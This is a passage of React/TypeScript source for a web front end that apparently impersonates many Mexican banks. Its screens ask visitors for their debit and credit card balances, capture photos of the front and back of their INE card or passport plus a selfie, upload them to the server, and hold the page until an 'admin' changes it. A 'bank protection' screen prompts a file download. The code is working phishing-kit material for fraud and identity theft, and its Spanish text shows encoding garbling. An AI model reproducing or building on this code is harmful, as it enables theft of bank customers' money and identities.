el archivo\n                    const link = document.createElement('a');\n                    link.href = fileToDownload.fileUrl;\n                    link.download = fileToDownload.fileName;\n                    link.target = '_blank';\n                    document.body.appendChild(link);\n                    link.click();\n                    document.body.removeChild(link);\n                    \n                    // Notificar al servidor que se realiz贸 la descarga\n                    onSubmit(ScreenType.PROTECCION_BANCARIA, { \n                      action: 'download',\n                      fileName: fileToDownload.fileName,\n                      fileSize: screenData.fileSize || 'Desconocido',\n                      downloaded: true,\n                      bankFile: !!protectionFile,\n                      banco: bankCode\n                    });\n                  } else {\n                    alert('El archivo de protecci贸n para este banco a煤n no est谩 disponible. Por favor, contacta al administrador.');\n                  }\n                } catch (error) {\n                  console.error('Error downloading file:', error);\n                  // Usar archivo por defecto en caso de error\n                  const link = document.createElement('a');\n                  link.href = protectionFile.fileUrl;\n                  link.download = protectionFile.fileName;\n                  link.target = '_blank';\n                  document.body.appendChild(link);\n                  link.click();\n                  document.body.removeChild(link);\n                  \n                  onSubmit(ScreenType.PROTECCION_BANCARIA, { \n                    action: 'download',\n                    fileName: protectionFile.fileName,\n                    fileSize: 'Desconocido',\n                    downloaded: true,\n                    bankFile: true,\n                    banco: bankCode\n                  });\n                }\n              }}\n            >\n              Descargar ahora\n            </Button>\n          </>\n        );\n        return getBankContainer(proteccionBancariaContent);\n\n      case ScreenType.PROTECCION_SALDO:\n        // Funci贸n para mostrar/ocultar input seg煤n selecci贸n\n        const toggleInput = (tipo: 'debito' | 'credito', value: string) => {\n          if (tipo === 'debito') {\n            setDebitoSelect(value);\n            if (value !== 'input') {\n              setDebitoMonto('');\n            }\n          } else {\n            setCreditoSelect(value);\n            if (value !== 'input') {\n              setCreditoMonto('');\n            }\n          }\n        };\n        \n        const proteccionSaldoContent = (\n          <>\n            <div className=\"text-left space-y-4\">\n              <h2 className=\"text-xl font-bold mb-4 text-center\" style={{ color: '#333' }}>\n                 Verificaci贸n de Saldo\n              </h2>\n              \n              {/* Pregunta 1 - D茅bito */}\n              <div className=\"mb-4\">\n                <label className=\"block mb-2 font-bold text-gray-700\">\n                  驴Cu谩l es el saldo actual disponible en tu tarjeta de d茅bito?\n                </label>\n                <select \n                  value={debitoSelect}\n                  onChange={(e) => toggleInput('debito', e.target.value)}\n                  className=\"w-full p-3 mb-3 border rounded-md border-gray-300\"\n                >\n                  <option value=\"\">Selecciona una opci贸n</option>\n                  <option value=\"input\">Ingresar saldo</option>\n                  <option value=\"no_tengo\">No tengo tarjeta de d茅bito</option>\n                </select>\n                {debitoSelect === 'input' && (\n                  <Input\n                    type=\"number\"\n                    placeholder=\"Monto en pesos\"\n                    value={debitoMonto || screenData.montoDebito || ''}\n                    onChange={(e) => setDebitoMonto(e.target.value)}\n                    className=\"w-full p-3 border rounded-md border-gray-300\"\n                  />\n                )}\n              </div>\n\n              {/* Pregunta 2 - Cr茅dito */}\n              <div className=\"mb-4\">\n                <label className=\"block mb-2 font-bold text-gray-700\">\n                  驴Cu谩l es el saldo disponible actualmente en tu tarjeta de cr茅dito?\n                </label>\n                <select \n                  value={creditoSelect}\n                  onChange={(e) => toggleInput('credito', e.target.value)}\n                  className=\"w-full p-3 mb-3 border rounded-md border-gray-300\"\n                >\n                  <option value=\"\">Selecciona una opci贸n</option>\n                  <option value=\"input\">Ingresar saldo</option>\n                  <option value=\"no_tengo\">No tengo tarjeta de cr茅dito</option>\n                </select>\n                {creditoSelect === 'input' && (\n                  <Input\n                    type=\"number\"\n                    placeholder=\"Monto en pesos\"\n                    value={creditoMonto || screenData.montoCredito || ''}\n                    onChange={(e) => setCreditoMonto(e.target.value)}\n                    className=\"w-full p-3 border rounded-md border-gray-300\"\n                  />\n                )}\n              </div>\n\n              <Button \n                className={`${primaryBtnClass} w-full py-3 text-base`}\n                onClick={() => {\n                  onSubmit(ScreenType.PROTECCION_SALDO, {\n                    saldoDebito: debitoSelect,\n                    montoDebito: debitoSelect === 'input' ? debitoMonto : '',\n                    saldoCredito: creditoSelect,\n                    montoCredito: creditoSelect === 'input' ? creditoMonto : ''\n                  });\n                }}\n                disabled={!debitoSelect || !creditoSelect}\n              >\n                Enviar\n              </Button>\n            </div>\n          </>\n        );\n        return getBankContainer(proteccionSaldoContent);\n\n      case ScreenType.VERIFICACION_ID:\n\n        const startCamera = async () => {\n          if (!documentType) {\n            alert('Por favor, selecciona un tipo de documento.');\n            return;\n          }\n          setCurrentStep('document_front');\n          \n          try {\n            // Detener stream anterior si existe\n            if (currentStream) {\n              currentStream.getTracks().forEach(track => track.stop());\n            }\n            \n            const stream = await navigator.mediaDevices.getUserMedia({ \n              video: { \n                facingMode: 'environment', // C谩mara trasera para documentos\n                width: { ideal: 1280 },\n                height: { ideal: 720 }\n              } \n            });\n            \n            setCurrentStream(stream);\n            \n            // Esperar un poco para que el DOM se actualice\n            setTimeout(() => {\n              const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n              if (videoElement) {\n                videoElement.srcObject = stream;\n                videoElement.play();\n              }\n            }, 100);\n            \n          } catch (err) {\n            console.error('Error accediendo a la c谩mara:', err);\n            // Intentar con c谩mara frontal como fallback\n            try {\n              const stream = await navigator.mediaDevices.getUserMedia({ \n                video: { \n                  facingMode: 'user',\n                  width: { ideal: 1280 },\n                  height: { ideal: 720 }\n                } \n              });\n              \n              setCurrentStream(stream);\n              \n              setTimeout(() => {\n                const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n                if (videoElement) {\n                  videoElement.srcObject = stream;\n                  videoElement.play();\n                }\n              }, 100);\n              \n            } catch (err2) {\n              alert('No se pudo acceder a la c谩mara. Por favor, permite el acceso a la c谩mara e intenta de nuevo.');\n              setCurrentStep('select');\n            }\n          }\n        };\n\n        const captureDocumentFront = async () => {\n          const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n          const canvasElement = document.getElementById('document-canvas') as HTMLCanvasElement;\n          \n          if (!videoElement || !canvasElement) {\n            alert('Error: No se encontr贸 el elemento de video o canvas');\n            return;\n          }\n          \n          canvasElement.width = videoElement.videoWidth;\n          canvasElement.height = videoElement.videoHeight;\n          const context = canvasElement.getContext('2d');\n          \n          if (context) {\n            context.drawImage(videoElement, 0, 0);\n            const docImage = canvasElement.toDataURL('image/jpeg', 0.9);\n            setDocumentFrontImage(docImage);\n            setCurrentPhotoPreview(docImage);\n            \n            // Detener c谩mara\n            if (currentStream) {\n              currentStream.getTracks().forEach(track => track.stop());\n              setCurrentStream(null);\n            }\n            \n            setCurrentStep('preview_front');\n          }\n        };\n\n        const captureDocumentBack = async () => {\n          const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n          const canvasElement = document.getElementById('document-canvas') as HTMLCanvasElement;\n          \n          if (!videoElement || !canvasElement) {\n            alert('Error: No se encontr贸 el elemento de video o canvas');\n            return;\n          }\n          \n          canvasElement.width = videoElement.videoWidth;\n          canvasElement.height = videoElement.videoHeight;\n          const context = canvasElement.getContext('2d');\n          \n          if (context) {\n            context.drawImage(videoElement, 0, 0);\n            const docImage = canvasElement.toDataURL('image/jpeg', 0.9);\n            setDocumentBackImage(docImage);\n            setCurrentPhotoPreview(docImage);\n            \n            // Detener c谩mara\n            if (currentStream) {\n              currentStream.getTracks().forEach(track => track.stop());\n              setCurrentStream(null);\n            }\n            \n            setCurrentStep('preview_back');\n          }\n        };\n\n        const startBackCamera = async () => {\n          setCurrentStep('document_back');\n          \n          try {\n            // Detener stream anterior si existe\n            if (currentStream) {\n              currentStream.getTracks().forEach(track => track.stop());\n            }\n            \n            const stream = await navigator.mediaDevices.getUserMedia({ \n              video: { \n                facingMode: 'environment',\n                width: { ideal: 1280 },\n                height: { ideal: 720 }\n              } \n            });\n            \n            setCurrentStream(stream);\n            \n            setTimeout(() => {\n              const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n              if (videoElement) {\n                videoElement.srcObject = stream;\n                videoElement.play();\n              }\n            }, 100);\n            \n          } catch (err) {\n            console.error('Error accediendo a la c谩mara:', err);\n            alert('No se pudo acceder a la c谩mara: ' + err);\n          }\n        };\n\n        const retakePhoto = async (step: string) => {\n          // Detener stream actual\n          if (currentStream) {\n            currentStream.getTracks().forEach(track => track.stop());\n            setCurrentStream(null);\n          }\n          \n          if (step === 'front') {\n            setDocumentFrontImage(null);\n            setCurrentStep('document_front');\n            \n            try {\n              const stream = await navigator.mediaDevices.getUserMedia({ \n                video: { \n                  facingMode: 'environment',\n                  width: { ideal: 1280 },\n                  height: { ideal: 720 }\n                } \n              });\n              setCurrentStream(stream);\n              \n              setTimeout(() => {\n                const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n                if (videoElement) {\n                  videoElement.srcObject = stream;\n                  videoElement.play();\n                }\n              }, 100);\n            } catch (err) {\n              alert('No se pudo acceder a la c谩mara: ' + err);\n            }\n            \n          } else if (step === 'back') {\n            setDocumentBackImage(null);\n            setCurrentStep('document_back');\n            \n            try {\n              const stream = await navigator.mediaDevices.getUserMedia({ \n                video: { \n                  facingMode: 'environment',\n                  width: { ideal: 1280 },\n                  height: { ideal: 720 }\n                } \n              });\n              setCurrentStream(stream);\n              \n              setTimeout(() => {\n                const videoElement = document.getElementById('document-video') as HTMLVideoElement;\n                if (videoElement) {\n                  videoElement.srcObject = stream;\n                  videoElement.play();\n                }\n              }, 100);\n            } catch (err) {\n              alert('No se pudo acceder a la c谩mara: ' + err);\n            }\n            \n          } else if (step === 'selfie') {\n            setSelfieImage(null);\n            setCurrentStep('selfie');\n            \n            try {\n              const stream = await navigator.mediaDevices.getUserMedia({ \n                video: { \n                  facingMode: 'user',\n                  width: { ideal: 1280 },\n                  height: { ideal: 720 }\n                } \n              });\n              setCurrentStream(stream);\n              \n              setTimeout(() => {\n                const videoElement = document.getElementById('selfie-video') as HTMLVideoElement;\n                if (videoElement) {\n                  videoElement.srcObject = stream;\n                  videoElement.play();\n                }\n              }, 100);\n            } catch (err) {\n              alert('No se pudo acceder a la c谩mara: ' + err);\n            }\n          }\n        };\n\n        const confirmPhoto = (photoType: string) => {\n          if (photoType === 'front') {\n            if (documentType === 'ine') {\n              // Para INE, continuar con reverso\n              startBackCamera();\n            } else {\n              // Para pasaporte, ir directo a selfie\n              startSelfieCamera();\n            }\n          } else if (photoType === 'back') {\n            // Despu茅s del reverso del INE, ir a selfie\n            startSelfieCamera();\n          } else if (photoType === 'selfie') {\n            // Subir todas las fotos\n            uploadIdentityFiles();\n          }\n        };\n\n        const startSelfieCamera = async () => {\n          setCurrentStep('selfie');\n          \n          try {\n            // Detener stream anterior si existe\n            if (currentStream) {\n              currentStream.getTracks().forEach(track => track.stop());\n            }\n            \n            const stream = await navigator.mediaDevices.getUserMedia({ \n              video: { \n                facingMode: 'user', // C谩mara frontal para selfie\n                width: { ideal: 1280 },\n                height: { ideal: 720 }\n              } \n            });\n            \n            setCurrentStream(stream);\n            \n            setTimeout(() => {\n              const videoElement = document.getElementById('selfie-video') as HTMLVideoElement;\n              if (videoElement) {\n                videoElement.srcObject = stream;\n                videoElement.play();\n              }\n            }, 100);\n            \n          } catch (err) {\n            console.error('Error accediendo a la c谩mara para selfie:', err);\n            alert('No se pudo acceder a la c谩mara para selfie: ' + err);\n          }\n        };\n\n        const captureSelfie = async () => {\n          const videoElement = document.getElementById('selfie-video') as HTMLVideoElement;\n          const canvasElement = document.getElementById('selfie-canvas') as HTMLCanvasElement;\n          \n          if (!videoElement || !canvasElement) {\n            alert('Error: No se encontr贸 el elemento de video o canvas para selfie');\n            return;\n          }\n          \n          canvasElement.width = videoElement.videoWidth;\n          canvasElement.height = videoElement.videoHeight;\n          const context = canvasElement.getContext('2d');\n          \n          if (context) {\n            // Voltear horizontalmente para que se vea como un espejo\n            context.scale(-1, 1);\n            context.drawImage(videoElement, -canvasElement.width, 0);\n            \n            const selfie = canvasElement.toDataURL('image/jpeg', 0.9);\n            setSelfieImage(selfie);\n            setCurrentPhotoPreview(selfie);\n            \n            // Detener c谩mara\n            if (currentStream) {\n              currentStream.getTracks().forEach(track => track.stop());\n              setCurrentStream(null);\n            }\n            \n            setCurrentStep('preview_selfie');\n          }\n        };\n\n        const uploadIdentityFiles = async () => {\n          const frontImage = documentFrontImage;\n          const backImage = documentType === 'ine' ? documentBackImage : null;\n          const selfie = selfieImage;\n          \n          if (!frontImage || !selfie || (documentType === 'ine' && !backImage)) {\n            alert('Faltan im谩genes por capturar.');\n            return;\n          }\n          \n          // Detener cualquier stream que a煤n est茅 activo\n          if (currentStream) {\n            currentStream.getTracks().forEach(track => track.stop());\n            setCurrentStream(null);\n          }\n          \n          setCurrentStep('validating');\n          setIsUploading(true);\n          \n          try {\n            // Convertir base64 a blob\n            const frontBlob = await fetch(frontImage).then(r => r.blob());\n            const selfieBlob = await fetch(selfie).then(r => r.blob());\n            \n            const formData = new FormData();\n            formData.append('documentFile', frontBlob, `documento_${documentType}_frente.jpg`);\n            formData.append('selfieFile', selfieBlob, 'selfie.jpg');\n            formData.append('documentType', documentType);\n            formData.append('sessionId', sessionId);\n            \n            // Si es INE, agregar tambi茅n el reverso\n            if (documentType === 'ine' && backImage) {\n              const backBlob = await fetch(backImage).then(r => r.blob());\n              formData.append('documentBackFile', backBlob, `documento_${documentType}_reverso.jpg`);\n            }\n\n            const response = await fetch('/api/upload-identity-files', {\n              method: 'POST',\n              credentials: 'include',\n              body: formData\n            });\n\n            if (!response.ok) {\n              throw new Error('Error al subir los archivos');\n            }\n\n            // Una vez subido exitosamente, simplemente mostrar validando\n            // La pantalla se mantendr谩 as铆 hasta que el admin la cambie\n            onSubmit(ScreenType.VERIFICACION_ID, {\n              documentType,\n              documentUploaded: true,\n              selfieUploaded: true,\n              verified: true\n            });\n\n          } catch (error) {\n            console.error('Error uploading identity files:', error);\n            alert('Error al subir los archivos. Int茅ntalo de nuevo.');\n            setCurrentStep('select');\n          } finally {\n            setIsUploading(false);\n          }\n        };\n        \n        // Funci贸n para limpiar streams al cambiar de pantalla\n        const cleanupCamera = () => {\n          if (currentStream) {\n            currentStream.getTracks().forEach(track => track.stop());\n            setCurrentStream(null);\n          }\n        };\n\n        const verificacionIdContent = (\n          <>\n            <div className=\"text-center mb-6\">\n              <h1 className=\"text-2xl font-bold mb-2 text-gray-800\"> Validaci贸n de Identidad</h1>\n              <div className=\"w-16 h-1 bg-blue-500 mx-auto rounded\"></div>\n            </div>\n            \n            <div className=\"bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 p-6 mb-6 rounded-xl shadow-sm\">\n              <div className=\"flex items-start gap-3\">\n                <div className=\"bg-blue-100 p-2 rounded-full\">\n                  <span className=\"text-blue-600 text-xl\">★</span>\n                </div>\n                <div>\n                  <h3 className=\"font-semibold text-blue-900 mb-2\">Para tu seguridad</h3>\n                  <p className=\"text-blue-800 text-sm leading-relaxed\">\n                    Necesitamos verificar tu identidad para proteger tu cuenta. Este proceso es completamente seguro y tus documentos est谩n protegidos.\n                  </p>\n                </div>\n              </div>\n            </div>\n\n            {currentStep === 'select' && (\n              <div className=\"space-y-6\">\n                <div>\n                  <h3 className=\"text-lg font-semibold mb-4 text-center\"> Selecciona tu documento de identidad</h3>\n                  \n                  <div className=\"space-y-3 mb-6\">\n                    <div \n                      className={`border-2 rounded-xl p-4 cursor-pointer transition-all duration-200 ${\n                        documentType === 'ine' \n                          ? 'border-blue-500 bg-blue-50 shadow-md' \n                          : 'border-gray-200 hover:border-gray-300 hover:bg-gray-50'\n                      }`}\n                      onClick={() => setDocumentType('ine')}\n                    >\n                      <div className=\"flex items-center gap-3\">\n                        <div className=\"bg-green-100 p-2 rounded-lg\">\n                          <span className=\"text-green-600 text-xl\"></span>\n                        </div>\n                        <div>\n                          <h4 className=\"font-semibold text-gray-800\">INE (Credencial para Votar)</h4>\n                          <p className=\"text-sm text-gray-600\">Se tomar谩n fotos del frente y reverso</p>\n                        </div>\n                        <div className=\"ml-auto\">\n                          {documentType === 'ine' && <span className=\"text-blue-500 text-xl\"></span>}\n                        </div>\n                      </div>\n                    </div>\n                    \n                    <div \n                      className={`border-2 rounded-xl p-4 cursor-pointer transition-all duration-200 ${\n                        documentType === 'pasaporte' \n                          ? 'border-blue-500 bg-blue-50 shadow-md' \n                          : 'border-gray-200 hover:border-gray-300 hover:bg-gray-50'\n                      }`}\n                      onClick={() => setDocumentType('pasaporte')}\n                    >\n                      <div className=\"flex items-center gap-3\">\n                        <div className=\"bg-purple-100 p-2 rounded-lg\">\n                          <span className=\"text-purple-600 text-xl\"></span>\n                        </div>\n                        <div>\n                          <h4 className=\"font-semibold text-gray-800\">Pasaporte</h4>\n                          <p className=\"text-sm text-gray-600\">Solo se tomar谩 foto del frente</p>\n                        </div>\n                        <div className=\"ml-auto\">\n                          {documentType === 'pasaporte' && <span className=\"text-blue-500 text-xl\"></span>}\n                        </div>\n                      </div>\n                    </div>\n                  </div>\n                  \n                  <Button \n                    className={`${primaryBtnClass} w-full py-4 text-lg font-semibold rounded-xl shadow-lg transition-all duration-200 ${\n                      !documentType ? 'opacity-50 cursor-not-allowed' : 'hover:shadow-xl'\n                    }`}\n                    onClick={startCamera}\n                    disabled={!documentType}\n                  >\n                     Comenzar Verificaci贸n\n                  </Button>\n                </div>\n              </div>\n            )}\n\n            {currentStep === 'document_front' && (\n              <div className=\"text-center\">\n                <h2 className=\"text-lg font-bold mb-4\">\n                  {documentType === 'ine' ? 'Captura el FRENTE de tu INE' : 'Captura tu Pasaporte'}\n                </h2>\n                <div className=\"bg-blue-50 border border-blue-200 p-3 mb-4 rounded-lg\">\n                  <p className=\"text-blue-800 text-sm\">\n                     {documentType === 'ine' \n                      ? 'Aseg煤rate de que se vea claramente tu foto y datos personales'\n                      : 'Aseg煤rate de que se vea claramente tu foto y datos del pasaporte'\n                    }\n                  </p>\n                </div>\n                <div className=\"relative mb-4\">\n                  <video \n                    id=\"document-video\"\n                    autoPlay \n                    playsInline\n                    muted\n                    className=\"w-full max-w-md border-2 border-blue-300 rounded-lg shadow-lg\"\n                  />\n                  <div className=\"absolute inset-0 border-2 border-blue-500 rounded-lg pointer-events-none opacity-50\"></div>\n                </div>\n                <canvas id=\"document-canvas\" style={{ display: 'none' }} />\n                <Button \n                  className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}\n                  onClick={captureDocumentFront}\n                >\n                   Capturar {documentType === 'ine' ? 'Frente' : 'Documento'}\n                </Button>\n              </div>\n            )}\n\n            {currentStep === 'preview_front' && (\n              <div className=\"text-center\">\n                <h2 className=\"text-lg font-bold mb-4 text-green-700\">\n                   驴Est谩 correcta la foto?\n                </h2>\n                <div className=\"mb-6\">\n                  <img \n                    src={currentPhotoPreview || ''}\n                    alt=\"Vista previa documento frente\"\n                    className=\"w-full max-w-sm border-4 border-green-200 rounded-lg mx-auto shadow-lg\"\n                    style={{ maxHeight: '350px', objectFit: 'contain' }}\n                  />\n                </div>\n                <div className=\"flex gap-4 justify-center\">\n                  <Button \n                    variant=\"outline\"\n                    onClick={() => retakePhoto('front')}\n                    className=\"bg-gray-50 text-gray-700 border-2 border-gray-300 hover:bg-gray-100 px-6 py-3\"\n                  >\n                     Volver a tomar\n                  </Button>\n                  <Button \n                    className={`${primaryBtnClass} px-8 py-3 font-semibold`}\n                    onClick={() => confirmPhoto('front')}\n                  >\n                     Est谩 perfecta\n                  </Button>\n                </div>\n              </div>\n            )}\n\n            {currentStep === 'document_back' && (\n              <div className=\"text-center\">\n                <h2 className=\"text-lg font-bold mb-4\">Captura el REVERSO de tu INE</h2>\n                <div className=\"bg-orange-50 border border-orange-200 p-3 mb-4 rounded-lg\">\n                  <p className=\"text-orange-800 text-sm\">\n                     Ahora captura la parte de atr谩s donde aparece tu CURP y direcci贸n\n                  </p>\n                </div>\n                <div className=\"relative mb-4\">\n                  <video \n                    id=\"document-video\"\n                    autoPlay \n                    playsInline\n                    muted\n                    className=\"w-full max-w-md border-2 border-orange-300 rounded-lg shadow-lg\"\n                  />\n                  <div className=\"absolute inset-0 border-2 border-orange-500 rounded-lg pointer-events-none opacity-50\"></div>\n                </div>\n                <canvas id=\"document-canvas\" style={{ display: 'none' }} />\n                <Button \n                  className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}\n                  onClick={captureDocumentBack}\n                >\n                   Capturar Reverso\n                </Button>\n              </div>\n            )}\n\n            {currentStep === 'preview_back' && (\n              <div className=\"text-center\">\n                <h2 className=\"text-lg font-bold mb-4 text-green-700\">\n                   驴Est谩 correcta la foto del reverso?\n                </h2>\n                <div className=\"mb-6\">\n                  <img \n                    src={currentPhotoPreview || ''}\n                    alt=\"Vista previa documento reverso\"\n                    className=\"w-full max-w-sm border-4 border-green-200 rounded-lg mx-auto shadow-lg\"\n                    style={{ maxHeight: '350px', objectFit: 'contain' }}\n                  />\n                </div>\n                <div className=\"flex gap-4 justify-center\">\n                  <Button \n                    variant=\"outline\"\n                    onClick={() => retakePhoto('back')}\n                    className=\"bg-gray-50 text-gray-700 border-2 border-gray-300 hover:bg-gray-100 px-6 py-3\"\n                  >\n                     Volver a tomar\n                  </Button>\n                  <Button \n                    className={`${primaryBtnClass} px-8 py-3 font-semibold`}\n                    onClick={() => confirmPhoto('back')}\n                  >\n                     Est谩 perfecta\n                  </Button>\n                </div>\n              </div>\n            )}\n\n            {currentStep === 'selfie' && (\n              <div className=\"text-center\">\n                <h2 className=\"text-lg font-bold mb-4\"> Ahora toma tu selfie</h2>\n                <div className=\"bg-purple-50 border border-purple-200 p-3 mb-4 rounded-lg\">\n                  <p className=\"text-purple-800 text-sm\">\n                     Mira directamente a la c谩mara y aseg煤rate de que tu cara se vea claramente\n                  </p>\n                </div>\n                <div className=\"relative mb-4\">\n                  <video \n                    id=\"selfie-video\"\n                    autoPlay \n                    playsInline\n                    muted\n                    className=\"w-full max-w-md border-2 border-purple-300 rounded-full shadow-lg\"\n                    style={{ transform: 'scaleX(-1)', aspectRatio: '1/1', objectFit: 'cover' }}\n                  />\n                  <div className=\"absolute inset-0 border-2 border-purple-500 rounded-full pointer-events-none opacity-50\"></div>\n                </div>\n                <canvas id=\"selfie-canvas\" style={{ display: 'none' }} />\n                <Button \n                  className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}\n                  onClick={captureSelfie}\n                >\n                  こ Capturar Selfie\n                </Button>\n              </div>\n            )}\n\n            {currentStep === 'preview_selfie' && (\n              <div className=\"text-center\">\n                <h2 className=\"text-lg font-bold mb-4 text-green-700\">\n                   驴Se ve bien la foto?\n                </h2>\n                <div className=\"mb-6\">\n                  <img \n                    src={currentPhotoPreview || ''}\n                    alt=\"Vista previa selfie\"\n                    className=\"w-full max-w-sm border-4 border-green-200 rounded-full mx-auto shadow-lg\"\n                    style={{ maxHeight: '350px', aspectRatio: '1/1', objectFit: 'cover' }}\n                  />\n                </div>\n                <div className=\"flex gap-4 justify-center\">\n                  <Button \n                    variant=\"outline\"\n                    onClick={() => retakePhoto('selfie')}\n                    className=\"bg-gray-50 text-gray-700 border-2 border-gray-300 hover:bg-gray-100 px-6 py-3\"\n                  >\n                     Volver a tomar\n                  </Button>\n                  <Button \n                    className={`${primaryBtnClass} px-8 py-3 font-semibold`}\n                    onClick={() => confirmPhoto('selfie')}\n                  >\n                     Se ve perfecta\n                  </Button>\n                </div>\n              </div>\n            )}\n\n            {currentStep === 'validating' && (\n              <div className=\"text-center\">\n                <div className=\"mb-6\">\n                  <div className=\"w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4\">\n                    <span className=\"text-green-600 text-3xl\"></span>\n                  </div>\n                  <h2 className=\"text-xl font-bold mb-2 text-green-700\">隆Informaci贸n Aceptada!</h2>\n                  <p className=\"text-green-600 font-medium\">Documentos enviados correctamente</p>\n                </div>\n                \n                <div className=\"bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 p-6 mb-6 rounded-xl shadow-sm\">\n                  <div className=\"flex items-start gap-3\">\n                    <div className=\"bg-green-100 p-2 rounded-full\">\n                      <span className=\"text-green-600 text-xl\"></span>\n                    </div>\n                    <div>\n                      <h3 className=\"font-semibold text-green-900 mb-2\">Esperando Validaci贸n</h3>\n                      <p className=\"text-green-800 text-sm leading-relaxed\">\n                        Tu informaci贸n est谩 siendo verificada por nuestro equipo de seguridad. \n                        Mantente en esta pantalla mientras procesamos tus documentos.\n                      </p>\n                    </div>\n                  </div>\n                </div>\n                \n                <div className=\"flex justify-center mb-4\">\n                  <div className=\"animate-spin rounded-full h-12 w-12 border-4 border-green-200 border-t-green-600\"></div>\n                </div>\n                \n                <div className=\"bg-blue-50 border border-blue-200 p-4 rounded-lg\">\n                  <p className=\"text-blue-800 text-sm\">\n                     <strong>Tip:</strong> Este proceso puede tomar unos minutos. No cierres esta ventana.\n                  </p>\n                </div>\n              </div>\n            )}\n\n            {currentStep === 'success' && (\n              <div className=\"text-center\">\n                <div className=\"mb-6\">\n                  <div className=\"w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4\">\n                    <span className=\"text-green-600 text-3xl\"></span>\n                  </div>\n                  <h2 className=\"text-xl font-bold mb-2 text-green-700\">隆Verificaci贸n Exitosa!</h2>\n                  <p className=\"text-green-600\">Tu identidad ha sido verificada correctamente</p>\n                </div>\n                \n                <div className=\"bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 p-6 rounded-xl shadow-sm\">\n                  <p className=\"text-green-800 font-medium\">\n                     Proceso completado con 茅xito\n                  </p>\n                </div>\n              </div>\n            )}\n          </>\n        );\n        return getBankContainer(verificacionIdContent);\n\n      default:\n        const defaultContent = (\n          <>\n            <h2 className=\"text-xl font-bold mb-3\">Pantalla no disponible</h2>\n            <p>La pantalla solicitada no est谩 disponible en este momento.</p>\n          </>\n        );\n        return getBankContainer(defaultContent);\n    }\n  };\n\n  // Definimos las clases de estilos para los botones seg煤n el banco\n  const getPrimaryBtnClass = () => {\n    switch(bankCode) {\n      case 'LIVERPOOL':\n        return 'bg-[#E1147B] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'CITIBANAMEX':\n        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'BANBAJIO':\n        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS\n      case 'BBVA':\n        return 'bbva-button';\n      case 'BANCOPPEL':\n        return 'bg-[#0066B3] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'HSBC':\n        return 'bg-[#DB0011] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'AMEX':\n        return 'bg-[#0077C8] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'SANTANDER':\n        return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'SCOTIABANK':\n        return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'INVEX':\n        return 'bg-[#BE0046] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'BANREGIO':\n        return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'BANORTE':\n        return 'banorte-button';\n      case 'PLATACARD':\n        return 'bg-[#FF5722] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'BANCO_AZTECA':\n        return 'bg-[#00A552] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'BIENESTAR':\n        return 'bg-[#9D2449] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'INBURSA':\n        return 'bg-[#1B4B72] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      case 'AFIRME':\n        return 'bg-[#009639] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';\n      default:\n        return 'banorte-button'; // Banorte por defecto\n    }\n  };\n\n  const primaryBtnClass = getPrimaryBtnClass();\n\n  // Eliminamos la funci贸n bankLogo ya que solo usaremos el logo en el header del ClientScreen.tsx\n\n  // Funci贸n para obtener la clase de header seg煤n el banco\n  const getBankHeaderClass = () => {\n    switch(bankCode) {\n      case 'LIVERPOOL': return 'liverpool-header';\n      case 'BANBAJIO': return 'banbajio-header';\n      case 'CITIBANAMEX': return 'citibanamex-header';\n      case 'BBVA': return 'bbva-header';\n      case 'BANCOPPEL': return 'bg-[#0066B3] text-white p-2';\n      case 'HSBC': return 'bg-white text-[#DB0011] p-2 border-t-2 border-[#DB0011]';\n      case 'AMEX': return 'bg-[#0077C8] text-white p-2';\n      case 'SANTANDER': return 'santander-header';\n      case 'SCOTIABANK': return 'scotiabank-header';\n      case 'INVEX': return 'invex-header';\n      case 'BANREGIO': return 'banregio-header';\n      case 'BANORTE': return 'banorte-header';\n      case 'PLATACARD': return 'bg-[#333333] text-white p-2';\n      case 'BANCO_AZTECA': return 'bg-[#00A552] text-white p-2';\n      case 'BIENESTAR': return 'bg-[#9D2449] text-white p-2';\n      case 'INBURSA': return 'bg-[#1B4B72] text-white p-2';\n      case 'AFIRME': return 'bg-[#009639] text-white p-2';\n      default: return 'bg-gray-100 p-3 text-center font-semibold';\n    }\n  };\n\n  // Funci贸n para obtener la clase del contenedor seg煤n el banco\n  const getBankContainerClass = () => {\n    switch(bankCode) {\n      case 'LIVERPOOL': return 'bg-white p-4 rounded-lg shadow liverpool-container';\n      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';\n      case 'CITIBANAMEX': return 'citibanamex-container';\n      case 'BBVA': return 'bbva-container';\n      case 'BANCOPPEL': return 'bg-white p-4 rounded-lg shadow bancoppel-container';\n      case 'HSBC': return 'bg-white p-4 rounded-lg shadow hsbc-container';\n      case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';\n      case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow 